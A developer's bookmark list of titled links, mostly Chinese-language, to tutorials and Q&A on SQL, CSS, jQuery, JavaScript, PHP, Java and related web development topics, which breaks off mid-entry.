日誌\nhttp://blog.xuite.net/jimmytwo/km/15151450-JSP%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%9C%89%E9%97%9C%E7%B6%B2%E5%9D%80%E7%9A%84%E8%B3%87%E8%A8%8A\n\nhttps://www.toadworld.com/platforms/ibmdb2/w/wiki/6738.update-and-delete-with-subselects\nhttps://www.toadworld.com/platforms/ibmdb2/w/wiki/6738.update-and-delete-with-subselects\n\nupdate 中加入 select 最常用的 update 语法  (转)*colindcli*新浪博客\nhttp://blog.sina.com.cn/s/blog_5e06afe00100ko51.html\n\n[CSS] Overflow 清除 Float 效果的妙用\nhttp://www.mrmu.com.tw/2011/02/19/css-overflow-clear-float/\n\ninternet explorer 8 - How can I get IE8 to accept a CSS :before tag? - Stack Overflow\nhttp://stackoverflow.com/questions/2546251/how-can-i-get-ie8-to-accept-a-css-before-tag\n\nhttp://blog.miniasp.com/post/2009/03/25/location-href-and-location-replace-in-practice.aspx\nhttp://blog.miniasp.com/post/2009/03/25/location-href-and-location-replace-in-practice.aspx\n\n黑貓宅急便\nhttp://www.t-cat.com.tw/Inquire/TraceDetail.aspx?BillID=9181640034&ReturnUrl=Trace.aspx\n\nFree 學習札記: DB2: Get current date with format YYYYMMDD\nhttp://mark-freefox.blogspot.tw/2013/08/db2-get-current-date-with-format.html\n\n[鐵人賽 Day2] GET/POST 的差異與配合 PHP 用法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天\nhttp://ithelp.ithome.com.tw/articles/10155801\n\n[T-SQL] with 語法\nhttp://ysde.blogspot.tw/2009/05/sql-with.html\n\nSQL 基礎語法(一) @ Jiang Ying-Fu 的部落格 :: 痞客邦 PIXNET ::\nhttp://fireleominor.pixnet.net/blog/post/50135569-sql%E5%9F%BA%E7%A4%8E%E8%AA%9E%E6%B3%95(%E4%B8%80)\n\nhttp://sql.yehyeh.net/content/Subqueries.php\nhttp://sql.yehyeh.net/content/Subqueries.php\n\nSQL Query 最佳化小小心得分享(Part I) / SQL Language / 程式設計俱樂部\nhttp://www.programmer-club.com.tw/ShowSameTitleN/sqllanguage/255.html\n\nAcoak.com\nhttp://blog.acoak.com/article/php-session-principle\n\nHttpSession 原理\nhttps://openhome.cc/Gossip/ServletJSP/BehindHttpSession.html\n\n常用的 CSS pseudo class (CSS 偽類) 教學與練習 - PART1 & Yijen's blog - hanasan # 天空部落 TIAN #\nhttp://hanasan.tian.yam.com/posts/93231753\n\n頁面載入發生問題\nhttps://jishus.org/?p=651\n\n頁面載入發生問題\nhttp://diary.blog.yam.com/shelbypercy/article/10143969\n\nJWorld@TW Java 論壇 - [新手必看] Java 字串的比較\nhttps://www.javaworld.com.tw/jute/post/view?bid=29&id=15157&sty=1&tpg=1&age=0\n\ngist:4389638\nhttps://gist.github.com/stanleytamta/4389638\n\n高性能、最终一致性的数据同步方案\nhttps://www.dozer.cc/2015/03/etl.html\n\ndatabase - accdb and PDO php connection error - Stack Overflow\nhttp://stackoverflow.com/questions/13787686/accdb-and-pdo-php-connection-error\n\nCSS: centering things\nhttps://www.w3.org/Style/Examples/007/center.en.html\n\nhttp://abpop23.pixnet.net/blog/post/9901266-php%E8%A8%B1%E5%8A%9F%E8%93%8B%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F\nhttp://abpop23.pixnet.net/blog/post/9901266-php%E8%A8%B1%E5%8A%9F%E8%93%8B%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F\n\nbatch file - Running Microsoft Access as a Scheduled Task - Stack Overflow\nhttp://stackoverflow.com/questions/20245053/running-microsoft-access-as-a-scheduled-task\n\nPHP 使用 SQLSRV 連結 MS SQL Server 設定教學 | ucamc\nhttp://www.ucamc.com/e-learning/computer-skills/146-php-sqlsrv.html\n\n有捨才有得: [php][pdo]bindParam bindValue 差別\nhttp://italwaysrainonme.blogspot.com/2012/11/phppdobindparam-bindvalue.html\n\n404 Not Found | Peggy Blog!\nhttp://blog.rx836.tw/blog/jquery-notes-1/\n\nClear text box in Jquery Autocomplete after selection - Stack Overflow\nhttp://stackoverflow.com/questions/11607938/clear-text-box-in-jquery-autocomplete-after-selection\n\n[實作] jQuery 新增刪除表格 - 廢人廢業誌\nhttp://note.junk.tw/2011/12/jquery.html\n\njavascript - Add table row in jQuery - Stack Overflow\nhttp://stackoverflow.com/questions/171027/add-table-row-in-jquery\n\njQuery append fadeIn - Stack Overflow\nhttp://stackoverflow.com/questions/978708/jquery-append-fadein\n\njQuery 阻止 input 按 Enter 就送出表單(form) | Web Development Notes\nhttps://yichen0831.wordpress.com/2013/05/19/jquery%E9%98%BB%E6%AD%A2input%E6%8C%89enter%E5%B0%B1%E9%80%81%E5%87%BA%E8%A1%A8%E5%96%AEform/\n\n有關 JQUERY 操作子元素的方法- 藍色小舖 BlueShop\nhttp://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD201301091546265VY.html\n\nJquery get input array field - Stack Overflow\nhttp://stackoverflow.com/questions/19529443/jquery-get-input-array-field\n\nJollen's PHP 專欄 :: 6. 如何做 PHP 的型別轉換？\nhttp://www.jollen.org/php/jollen_php_book_6_php.html\n\nJavaScript 教學 - 資料型態(Data Type) - 上 @ 小殘的程式光廊 :: 痞客邦 PIXNET ::\nhttp://emn178.pixnet.net/blog/post/94150562-javascript%E6%95%99%E5%AD%B8---%E8%B3%87%E6%96%99%E5%9E%8B%E6%85%8B(data-type)---%E4%B8%8A\n\nRon, Run ~~: PDO - 取得資料的方式\nhttp://ron314159.blogspot.tw/2013/08/pdo-get-data-methods.html\n\nprinting - CSS to set A4 paper size - Stack Overflow\nhttp://stackoverflow.com/questions/16649943/css-to-set-a4-paper-size\n\nhtml - Add border-bottom to table row <tr> - Stack Overflow\nhttp://stackoverflow.com/questions/10040842/add-border-bottom-to-table-row-tr\n\nCSS:print - TestingMediawiki\nhttps://www.andcycle.idv.tw/mediawiki/index.php/CSS:print\n\n活到老學到老-CSS Media Types - 黑暗執行緒\nhttp://blog.darkthread.net/post-2009-11-06-css-media-types.aspx\n\nhtml - How to print table using javascript? - Stack Overflow\nhttp://stackoverflow.com/questions/21375398/how-to-print-table-using-javascript\n\nhttp://stockwfj3.pixnet.net/blog/post/61978697-%5Bphp%5Dstr_getcsv-%E8%A7%A3%E6%9E%90%E4%B8%80%E5%80%8B-csv%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%B0%E4%B8%80%E5%80%8B%E6%95%B8%E7%B5%84\nhttp://stockwfj3.pixnet.net/blog/post/61978697-%5Bphp%5Dstr_getcsv-%E8%A7%A3%E6%9E%90%E4%B8%80%E5%80%8B-csv%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%B0%E4%B8%80%E5%80%8B%E6%95%B8%E7%B5%84\n\nPHP 函式 str_getcsv @ Vexed's Blog :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/vexed/tech/47476337-PHP+%E5%87%BD%E5%BC%8F+str_getcsv\n\nhttp://en.allexperts.com/q/Using-MS-Access-1440/Importing-CSV-MS-Access.htm\nhttp://en.allexperts.com/q/Using-MS-Access-1440/Importing-CSV-MS-Access.htm\n\nPage not found · GitHub Pages\nhttp://blog.blackbing.net/post/2014/05/09/javascript-deferred-ordered-task\n\n010 Better and Better 工程師就業兩年多的心得雜談\nhttps://www.slideshare.net/BruceLi2/010-better-and-better\n\nHow to make Scrollable Table with fixed headers using CSS - Stack Overflow\nhttp://stackoverflow.com/questions/19559197/how-to-make-scrollable-table-with-fixed-headers-using-css\n\nhtml - CSS-Only Scrollable Table with fixed headers - Stack Overflow\nhttp://stackoverflow.com/questions/11891065/css-only-scrollable-table-with-fixed-headers\n\nTable with fixed header on scroll\nhttp://codepen.io/jgx/pen/wiIGc\n\njQuery.Callbacks() | jQuery API 中文文档(适用 jQuery 1.0 - jQuery 3.1)\nhttp://www.css88.com/jqapi-1.9/jQuery.Callbacks/\n\n[Java] 讀取 src 下的設定檔| @ 資訊園 :: 痞客邦 PIXNET ::\nhttp://fecbob.pixnet.net/blog/post/43286053-%5Bjava%5D-%E8%AE%80%E5%8F%96src%E4%B8%8B%E7%9A%84%E8%A8%AD%E5%AE%9A%E6%AA%94%7C\n\nPhpcubes.com\nhttp://www.phpcubes.com/how-to-shift-htdocs-folder-of-xampp-in-another-drive.html\n\nXAMPP 網頁伺服器架站工具設定與使用教學 | PcSetting Blog\nhttps://www.pcsetting.com/devtools/54?page=0%2C0\n\nPapa Parse - Powerful CSV Parser for JavaScript\nhttp://papaparse.com/\n\nCSS - CSS 框架\nhttp://zh-tw.learnlayout.com/frameworks.html\n\n轉載：逐字的 utf8 轉 big5 @ 右腦 想去環遊世界 :: 痞客邦 PIXNET ::\nhttp://yoonow.pixnet.net/blog/post/11141571-%E8%BD%89%E8%BC%89%EF%BC%9A%E9%80%90%E5%AD%97%E7%9A%84utf8%E8%BD%89big5\n\n[PHP]utf8 轉 big5 之方法 - PHP 程式 學習 筆記本\nhttp://calos-tw.blogspot.tw/2008/04/phputf8big5.html\n\n頁面載入發生問題\nhttp://www.ddhigh.com/2014/09/php-website-auto-update/\n\n【CSS FAQ】偽元素 (pseudo element) 和偽類 (pseudo class) 差在哪？ – 字串小豬\nhttps://stringpiggy.hpd.io/pseudo-element-pseudo-class-difference/\n\nhttp://blog.miniasp.com/post/2011/04/26/jQuery-get-form-value-Checkbox-Radio.aspx\nhttp://blog.miniasp.com/post/2011/04/26/jQuery-get-form-value-Checkbox-Radio.aspx\n\n程式扎記: [ Java 小學堂 ] 多線程設計模式 : 線程的共享互斥與 synchronized 介紹\nhttp://puremonkey2010.blogspot.tw/2010/08/java-synchronized.html\n\nhttp://bioankeyang.blogspot.com/2015/04/javaregular-expression.html\nhttp://bioankeyang.blogspot.com/2015/04/javaregular-expression.html\n\nhttp://weisnote.blogspot.com/2011/12/java-regex.html\nhttp://weisnote.blogspot.com/2011/12/java-regex.html\n\nGiveMePasS's Android 惡補筆記: 如何使用正規表示法-3\nhttp://givemepass.blogspot.tw/2012/03/3.html\n\n腦子備份: Regular Expression: Regex 所使用的符號彙整\nhttp://milkrsvs.blogspot.tw/2013/04/regular-expression-regex.html\n\n頁面載入發生問題\nhttps://free.com.tw/ssl-for-free/\n\nLet's Encrypt 的 SSL 憑證安裝 - Tsung's Blog\nhttps://blog.longwin.com.tw/2015/11/let-encrypt-ssl-certificate-setup-2015/\n\nLet's Encrypt 使用說明 (非官方)\nhttps://letsencrypt.tw/\n\njavascript - What is the difference between String.slice and String.substring? - Stack Overflow\nhttp://stackoverflow.com/questions/2243824/what-is-the-difference-between-string-slice-and-string-substring\n\n被遺忘的瞇瞇: javascript - showmodaldialog 與 parent 資料傳遞\nhttp://sheauren.blogspot.tw/2011/12/javascript-showmodaldialogparent.html\n\nJavascript 单元测试框架 Qunit 和 Jasmine 的比较 – Benjamin\nhttp://www.zuojj.com/archives/440.html\n\n實作 Cross-Origin Resource Sharing (CORS) 解決 Ajax 發送跨網域存取 Request - Soul & Shell Blog\nhttps://blog.toright.com/\nposts/3205/%E5%AF%A6%E4%BD%9C-cross-origin-resource-sharing-cros-%E8%A7%A3%E6%B1%BA-ajax-%E7%99%BC%E9%80%81%E8%B7%A8%E7%B6%B2%E5%9F%9F%E5%AD%98%E5%8F%96-request.html\njs-stackoverflow-highest-votes/unittest-tools-in-javascript.md at master · simongong/js-stackoverflow-highest-votes\nhttps://github.com/simongong/js-stackoverflow-highest-votes/blob/master/questions11-20/unittest-tools-in-javascript.md\n\nhank7444/qunitTutorialTW: it is a traditional chinese qunit tutorial for web frond-end developers.\nhttps://github.com/hank7444/qunitTutorialTW\n\ndwqs/blog: My New Blog's Address. Welcome to star\nhttps://github.com/dwqs/blog\n\nJAVA 筆記：Thread 多工執行緒 @ 來喝杯 JAVA 咖啡 :: 痞客邦 PIXNET ::\nhttp://yaya741228.pixnet.net/blog/post/76633527-java%E7%AD%86%E8%A8%98%EF%BC%9Athread-%E5%A4%9A%E5%B7%A5%E5%9F%B7%E8%A1%8C%E7%B7%92\n\nHatena Blog\nhttp://blog.hatena.ne.jp/login?blog=http%3A%2F%2Fknt45.hatenablog.com%2Fentry%2F20120810%2F1344608033\n\njavascript で月初、月末取得 - Qiita\nhttp://qiita.com/su_mi/items/2f086817a4dd0b05f304\n\njava-一个月的第一天和最后一天 - - ITeye 技术网站\nhttp://stevenjohn.iteye.com/blog/1062672\n\nVITO の 學習筆記: 函式\nhttp://vito-note.blogspot.tw/2014/08/blog-post_10.html\n\n(Javascript) Lazy Function Definition | Chui-Wen Chiu's Note\nhttps://chuiwenchiu.wordpress.com/2007/08/15/javascript-lazy-function-definition/\n\nForsource\nhttp://forsourcecode.blogspot.com/search?updated-max=2014-02-05T02:07:00-08:00&max-results=7\n\nJavascript ES6 - (Let + Const) ~ Marc Talk\nhttps://ccw1986.blogspot.com/2016/03/javascript-es6-let-const.html\n\nhttp://xination.pixnet.net/blog/post/23298242-%E5%BF%83%E5%BE%97----%E9%8D%B5%E7%9B%A4%E7%AC%A6%E8%99%9F%E4%B8%8A%E7%9A%84%E8%8B%B1%E6%96%87%E8%AC%9B%E6%B3%95\nhttp://xination.pixnet.net/blog/post/23298242-%E5%BF%83%E5%BE%97----%E9%8D%B5%E7%9B%A4%E7%AC%A6%E8%99%9F%E4%B8%8A%E7%9A%84%E8%8B%B1%E6%96%87%E8%AC%9B%E6%B3%95\n\n撒母耳日誌: [ES2015 學習筆記] 區塊變數: let\nhttp://hebrewjudges.blogspot.tw/2015/05/es6-let.html\n\n定義 JavaScript 函數（Functions）的各種方式 - G. T. Wang\nhttps://blog.gtwang.org/programming/defining-javascript-functions/\n\nJavascript – Hoisting | Majesty\nhttps://nicole929chan.wordpress.com/2015/09/25/javascript-hoisting/\n\nVariable and Function Hoisting in JavaScript - A Drip of JavaScript\nhttp://adripofjavascript.com/blog/drips/variable-and-function-hoisting\n\n頁面載入發生問題\nhttp://feed.hjue.me/articles/detail/2015-06-22/553936/javascript-string-jquery\n\n[程式][jquery] 自己的第一個 JQuery Plugin! Hello World。(Part_01) @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 PIXNET ::\nhttp://expect7.pixnet.net/blog/post/38085270-%5B%E7%A8%8B%E5%BC%8F%5D%5Bjquery%5D-%E8%87%AA%E5%B7%B1%E7%9A%84%E7%AC%AC%E4%B8%80%E5%80%8Bjquery-plugin!-hello-worl\n\nJavaScript: 正規表達式 RegExp 應用（String, RegExp Method） | =ChenTsu=\nhttps://chentsu.wordpress.com/2014/03/04/javascript-%E6%AD%A3%E8%A6%8F%E8%A1%A8%E9%81%94%E5%BC%8F-regexp-%E6%87%89%E7%94%A8%EF%BC%88string-regexp-method%EF%BC%89/\n\n为什么不要使用 eval - JavaScript 秘密花园 - 极客学院 Wiki\nhttp://wiki.jikexueyuan.com/project/javascript-garden/core/eval.html\n\njQuery.extend 的用法 - 黑暗執行緒\nhttp://blog.darkthread.net/post-2009-03-01-jquery-extend.aspx\n\nJava 8 New API Tips\nhttps://ingramchen.io/blog/2014/04/java-8-new-api-tips.html\n\nJavascript - 淺談 this 與 Closure - 黑暗執行緒\nhttp://blog.darkthread.net/blogs/darkthreadtw/archive/2009/03/11/js-this-and-closure.aspx\n\n[译]JavaScript 中的两个 0 - 紫云飞 - 博客园\nhttp://www.cnblogs.com/ziyunfei/archive/2012/12/10/2777099.html\n\nTop 10 free database tools for sys admins\nhttps://techtalk.gfi.com/top-10-free-database-tools-for-sys-admins/\n\nLamb & Vampire: DB2 心得分享\nhttp://lambvampire.blogspot.tw/2009/01/db2.html\n\nRUN!PC ｜精選文章｜開發技術｜初探 ECMAScript 6 (上)\nhttp://www.runpc.com.tw/content/content.aspx?id=109836\n\nlet - JavaScript | MDN\nhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let\n\nWeb Scripting Simplified for JavaScript & TypeScript\nhttps://www.genuitec.com/tech/web-scripting/\n\nProtecting objects in JavaScript\nhttp://2ality.com/2013/08/protecting-objects.html\n\nJavaScript 日期及時間、取得某月天數、毫秒轉換成日期\nhttp://www.eion.com.tw/Blogger/?Pid=1148\n\nJavaScript Date Formats\nhttps://www.w3schools.com/js/js_date_formats.asp\n\n小爪哇的初發: JavaScript 上的同名函數陷阱！！\nhttp://ace33022.blogspot.tw/2010/10/javascript.html\n\nCollections.EMPTY_LIST 和 Collections.emptyList()简单使用体会 - 知行天下 - ITeye 技术网站\nhttp://inter12.iteye.com/blog/1023761\n\nECMAScript Language Specification - ECMA-262 Edition 5.1\nhttp://www.ecma-international.org/ecma-262/5.1/#sec-15.9.1.15\n\nD3js 如何兼容 IE8\nhttps://www.douban.com/group/topic/38381270/\n\nhttp://blog.miniasp.com/post/2009/10/29/The-six-versions-that-let-DOM-focus-using-jQuery.aspx\nhttp://blog.miniasp.com/post/2009/10/29/The-six-versions-that-let-DOM-focus-using-jQuery.aspx\n\n網頁設計資源彙整 - Web Design Resources\nhttps://simular.co/resources/\n\nJWorld@TW Java 論壇 - break 與 continue 的標籤用法\nhttps://www.javaworld.com.tw/jute/post/view?age=0&bid=29&ppg=1&sty=1&id=64117&tpg=1\n\nShiny\nhttps://blog.shinychang.net/\n\nSublime Text 2: The Best Editor in 2012 - @ChingHanHo\nhttp://blog.chh.tw/posts/sublime-text-2-the-best-editor-in-2012/\n\nrtfd/readthedocs.org: source code to readthedocs.org\nhttps://github.com/rtfd/readthedocs.org\n\nspitfire-sidra/git-tutorial: Git 版本控制教學\nhttps://github.com/spitfire-sidra/git-tutorial\n\nsublime text3 前端常用 plugin 整理 « 弱弱前端碎碎念\nhttp://heyyou.logdown.com/posts/220319-sublime-front-end-plugin-sorting\n\n精通編輯器！Sublime Text 2 – Plugins 好用插件整理 | =ChenTsu=\nhttps://chentsu.wordpress.com/2014/01/09/sublime-text-2-plugins-%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6%E6%95%B4%E7%90%86/\n\nWhat's the best way to build a string of delimited items in Java? - Stack Overflow\nhttp://stackoverflow.com/questions/63150/whats-the-best-way-to-build-a-string-of-delimited-items-in-java\n\nJWorld@TW Java 論壇 - 給新手 - 使用 StringTokenizer 分離字串\nhttps://www.javaworld.com.tw/jute/post/view?bid=29&id=14489&sty=3\n\n[note] 如何用 PHP 定時抓網頁或 Facebook 資料 « Vanishing Point\nhttp://vanishingpoint.logdown.com/posts/164616/how-to-use-php-timed-grab-web-pages-or-facebook-data\n\nStringTokenizer 與 split( ) 的差別 - 程式學習筆記\nhttps://sites.google.com/site/chengshixuexipingtai/java/stringtokenizer-yu-split-de-cha-bie\n\njsp - Difference Between import and class.forName in java - Stack Overflow\nhttp://stackoverflow.com/questions/19674752/difference-between-import-and-class-forname-in-java\n\nstatic 類別成員\nhttps://openhome.cc/Gossip/Java/Static.html\n\nHTML 表格欄寬分配實驗 - 黑暗執行緒\nhttp://blog.darkthread.net/post-2014-03-20-missing-column.aspx\n\nhtml - Why text-align doesn't work in colgroup? - Stack Overflow\nhttp://stackoverflow.com/questions/5447957/why-text-align-doesnt-work-in-colgroup\n\nEquivalent of LIMIT for DB2 - Stack Overflow\nhttp://stackoverflow.com/questions/3885193/equivalent-of-limit-for-db2\n\n壞掉的印表機 - 設計、生活、態度: [CSS Hack] Google chrome CSS hack 快速修正所有瀏覽器技巧\nhttp://amos-lee.blogspot.tw/2010/11/css-hack-chrome-css-hack.html\n\n關於 Checkbox Click 事件的小發現 - 黑暗執行緒\nhttp://blog.darkthread.net/post-2009-05-29-something-about-js-event.aspx\n\n【卜維丰】避免子物件的 onclick 事件同時引發父物件事件\nhttp://audi.tw/Blog/Javascript/javascript-onclick-e.target.event-srcElement.asp\n\njavascript - jQuery.click() vs onClick - Stack Overflow\nhttp://stackoverflow.com/questions/12627443/jquery-click-vs-onclick\n\njavascript - 好用的 route hashchange 类似 history.js 思路 - SegmentFault\nhttps://segmentfault.com/q/1010000000627461\n\njavascript reduce() forEach() map() 小紀錄 | 胖胖喵的筆記本 - 點部落\nhttps://dotblogs.com.tw/mobile_net/2016/05/13/091724\n\n一些關於前端 Framework 的想法（下） – Medium\nhttps://medium.com/@tomchentw/framework-a3befb7db904\n\nCSS display: inline vs inline-block - Stack Overflow\nhttp://stackoverflow.com/questions/9189810/css-display-inline-vs-inline-block\n\nhttp://blog.miniasp.com/post/2009/04/20/Use-CSS-table-layout-property-to-speed-up-table-rendering.aspx\nhttp://blog.miniasp.com/post/2009/04/20/Use-CSS-table-layout-property-to-speed-up-table-rendering.aspx\n\nCSS 文字的換行 - OXXO.STUDIO\nhttp://www.oxxostudio.tw/articles/201406/css-word-break.html\n\nDetails of the object model - JavaScript | MDN\nhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Details_of_the_Object_Model\n\n你真的了解 word-wrap 和 word-break 的区别吗？ - 无双 - 博客园\nhttp://www.cnblogs.com/2050/archive/2012/08/10/2632256.html\n\nhtml - div vertical align middle css - Stack Overflow\nhttp://stackoverflow.com/questions/18649106/div-vertical-align-middle-css\n\nUnderscore – WEB 前端开发 - 专注前端开发，关注用户体验\nhttp://www.css88.com/archives/tag/underscore\n\njquery - difference between :first and :first-child not clear - Stack Overflow\nhttp://stackoverflow.com/questions/2946205/difference-between-first-and-first-child-not-clear\n\n頁面載入發生問題\nhttp://www.zhangxinxu.com/wordpress/2011/06/css3%E9%80%89%E6%8B%A9%E5%99%A8nth-child%E5%92%8Cnth-of-type%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82/\n\nCSS3 選擇器「:nth-child()」與「:nth-of-type()」用法大不同|梅問題．教學網\nhttps://www.minwt.com/webdesign-dev/css/10885.html\n\njQuery 1.7 筆記 - 黑暗執行緒\nhttp://blog.darkthread.net/post-2011-11-07-jquery-1-7-release.aspx\n\n404 Not Found | Peggy Blog!\nhttp://blog.rx836.tw/blog/jquery-html-forms/\n\nEdit fiddle - JSFiddle\nhttp://jsfiddle.net/UQsKh/1/\n\nPython 爬虫的工具列表 - Python - 伯乐在线\nhttp://python.jobbole.com/82633/\n\nXMLTABLE by example, Part 1: Retrieving XML data in relational format\nhttps://www.ibm.com/developerworks/data/library/techarticle/dm-0708nicola/\n\n搞清楚 Javascript this 和 jQuery \\$.proxy() | 化繁為簡\nhttps://zwjian.wordpress.com/2011/10/16/javascript_this_and_jquery_proxy/\n\narrays - Javascript call() & apply() vs bind()? - Stack Overflow\nhttp://stackoverflow.com/questions/15455009/javascript-call-apply-vs-bind\n\njQuery 中\\$.proxy()的原理和使用 - 令狐葱 ★ - 博客园\nhttp://www.cnblogs.com/jiji262/archive/2013/04/25/3043459.html\n\nmrkt 的程式學習筆記: jQuery 對下拉選單 DropDownList 的操作 - 1\nhttp://kevintsengtw.blogspot.com/2011/09/jquery-dropdownlist-1.html\n\njQuery insertAfter vs. .after vs. .appendTo vs. .append - JSFiddle\nhttp://jsfiddle.net/designaroni/b33tL7hu/\n\nJQuery 中 html、append、appendTo、after、insertAfter、before、insertBefore、empty、remove 系列方法的使用。 - sunpeiyumail 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/sunpeiyumail/article/details/7665668\n\nApache AXIS 2 - SOAP Web Service 實作教學 (即時天氣預報) - Soul & Shell Blog\nhttps://blog.toright.com/posts/268/apache-axis-2-soap-web-service-%E5%AF%A6%E4%BD%9C%E6%95%99%E5%AD%B8-%E5%8D%B3%E6%99%82%E5%A4%A9%E6%B0%A3%E9%A0%90%E5%A0%B1.html\n\nrequest.getParameter() 、 request.getInputStream()和 request.getReader() 使用体会 - clam_clam 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/clam_clam/article/details/6570539\n\n建立 Web Service 程式(asmx 檔) - Eason's 教學平台\nhttps://sites.google.com/site/easonsjiaoxuepingtai/asp-net-web-service/jian-liweb-service-cheng-shi-asmx-dang\n\nyilin 的程式日記: [Java] 在 Java 程式中呼叫 .Net 的 Web Service\nhttp://yilinliu.blogspot.com/2010/07/java-java-net-web-service.html\n\n利用 Eclipse 簡單建立 AXIS 的 WebService @ 大笨鳥的私房菜 :: 痞客邦 PIXNET ::\nhttp://camuschou.pixnet.net/blog/post/13993595-%E5%88%A9%E7%94%A8-eclipse-%E7%B0%A1%E5%96%AE%E5%BB%BA%E7%AB%8B-axis-%E7%9A%84-webservice\n\n[筆記] Web Service 概述 | m@rcus 學習筆記 - 點部落\nhttps://dotblogs.com.tw/marcus116/2011/08/28/34524\n\n[筆記] 了解 function borrowing 和 function currying ─ bind(), call(), apply() 的應用 | PJCHENder 愛分享\nhttps://pjchender.blogspot.com/2016/06/function-borrowingfunction-currying.html\n\n超強 1000 個 jquery 插件！（連載中。。。。最近更新 2011 年 01 月 25 日）|精彩博文 - 博搜網\nhttp://cocboso.com/subject/about/16657.html\n\n純 CSS 的下拉式選單 - Astral web 歐斯瑞公司\nhttp://www.astralweb.com.tw/pure-css-drop-down-menu/\n\nXYZ 的筆記本: PHP 讀取 BIG5 編碼的 CSV 檔\nhttp://xyz.cinc.biz/2013/12/php-fgetcsv-backslash.html\n\n頁面載入發生問題\nhttp://inder.com.tw/ios-architecture-patterns-mvc-mvp-mvvm-viper/\n\n[VueJS] VueJS 小小心得\nhttps://blog.hinablue.me/js-vue-js-xiao-xiao-xin-de/\n\njQuery UI Menu Example\nhttps://codepen.io/ellomumsy/pen/jenzG\n\nPHP Array Beautifier | phillihp’s tech blog – Phil’s Tech Blog\nhttp://phillihp.com/toolz/php-array-beautifier/\n\nNW.js & Electron Compared - TangibleJS\nhttp://tangiblejs.com/posts/nw-js-electron-compared\n\nCharles Web Debugging Proxy • HTTP Monitor / HTTP Proxy / HTTPS & SSL Proxy / Reverse Proxy\nhttps://www.charlesproxy.com/\n\nRay Lee : [JQuery] find() 與 filter() 用法區別\nhttp://raylee0616.blogspot.tw/2013/09/jquery-find-chidren-filter.html\n\n如何形象地解释 JavaScript 中 map、foreach、reduce 间的区别？ - 知乎\nhttps://www.zhihu.com/question/24927450\n\nreduce | underscorejs 学习参考\nhttps://niec-fe.gitbooks.io/underscorejs/content/collections/reduce.html\n\njavascript - Jquery and Jslint - ' was used before it was defined - Stack Overflow\nhttp://stackoverflow.com/questions/18251388/jquery-and-jslint-was-used-before-it-was-defined\n\nJSHint 选项列表 | bubkoo\nhttp://bubkoo.com/2014/02/22/JSHint-options/\n\n頁面載入發生問題\nhttp://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/\n\ninline-block、BFC、边距合并\nhttp://blog.leanote.com/post/605988809@qq.com/inline-block%E3%80%81BFC%E3%80%81%E8%BE%B9%E8%B7%9D%E5%90%88%E5%B9%B6\n\n理解 CSS 中 BFC_CSS, BFC 教程\\_w3cplus\nhttp://www.w3cplus.com/css/understanding-block-formatting-contexts-in-css.html\n\nPass a variable to JQuery UI dialog - Stack Overflow\nhttp://stackoverflow.com/questions/14898765/pass-a-variable-to-jquery-ui-dialog\n\nPage not found · GitHub\nhttps://gist.github.com/videde/14436c9662769df8c38e\n\nFree Web Proxy\nhttps://whoer.net/webproxy\n\nhttp://blog.csdn.net/violetjack0808/article/details/51508877\nhttp://blog.csdn.net/violetjack0808/article/details/51508877\n\nSublime Text 使用教程（Windows 系统下 Sublime Text3）\nhttp://front-end.leanote.com/post/Sublime-Text\n\n本文介绍 Android 及 IPhone 手机上如何进行网络数据抓包，比如我们想抓某个应用(微博、微信、墨迹天气)的网络通信请求就可以利用这个方法。\nhttp://www.trinea.cn/android/android-network-sniffer/\n\nin operator - JavaScript | MDN\nhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/in\n\ncss - Multiple attribute jQuery selector not working in IE8 - Stack Overflow\nhttp://stackoverflow.com/questions/25200455/multiple-attribute-jquery-selector-not-working-in-ie8\n\njQuery 面试题 | 前端工程师手册\nhttps://leohxj.gitbooks.io/front-end-database/content/interview/interview-exercises-with-jquery.html\n\n頁面載入發生問題\nhttp://eghrum.cgjgxqznxkgj.lgtkz.se1.gsr.awhoer.net/post-2011-10-25-jquery-data-attr-notes.aspx\n\n介紹 | 前端工程师手册\nhttps://leohxj.gitbooks.io/front-end-database/content/\n\n10 個 JS、jQuery 效能調校方法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天\nhttp://ithelp.ithome.com.tw/articles/10091980\n\njquery - How to break line in jQueryUI tooltip - Stack Overflow\nhttp://stackoverflow.com/questions/13066909/how-to-break-line-in-jqueryui-tooltip\n\ncss - How do I make an html link look like a button? - Stack Overflow\nhttp://stackoverflow.com/questions/710089/how-do-i-make-an-html-link-look-like-a-button\n\n[轉][javascript] JS 中如何判断－null @ 碎碎念 :: 隨意窩 Xuite 日誌\nhttp://blog.xuite.net/dizzy03/murmur/46782052-%5B%E8%BD%89%5D%5BJavascript%5D+JS+%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%EF%BC%8Dnull\n\nidiomatic.js/readme.md at master · rwaldron/idiomatic.js\nhttps://github.com/rwaldron/idiomatic.js/blob/master/translations/zh_TW/readme.md\n\nThe Problems of JSHint (JSHint 的問題) | 格物致知\nhttps://amobiz.github.io/2015/12/20/problems-of-jshint/\n\n用 grunt 搭建自動化的 web 前端開發環境-完整教程 - 壹讀\nhttps://read01.com/GJNPLB.html\n\n[Node.js]很好用的 package.json @ 賽拉維的秋天 :: 痞客邦 PIXNET ::\nhttp://cire.pixnet.net/blog/post/36601110-%5Bnode.js%5D%E5%BE%88%E5%A5%BD%E7%94%A8%E7%9A%84package.json\n\nAndroid Intent&Bundle 傳遞資料(包含傳遞自定義物件) @ Mazs's Notes :: 痞客邦 PIXNET 